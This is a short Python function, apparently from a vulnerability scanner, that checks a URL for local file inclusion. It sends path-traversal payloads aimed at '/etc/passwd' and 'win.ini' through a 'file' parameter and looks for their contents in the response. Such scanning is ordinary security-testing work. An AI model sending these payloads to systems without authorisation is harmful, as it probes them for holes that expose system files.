
import requests

def scan(url):
    lfi_payloads = ["../../../../etc/passwd", "../windows/win.ini"]
    for payload in lfi_payloads:
        test_url = f"{url}?file={payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if "root:" in r.text or "[extensions]" in r.text:
                return True
        except:
            continue
    return False
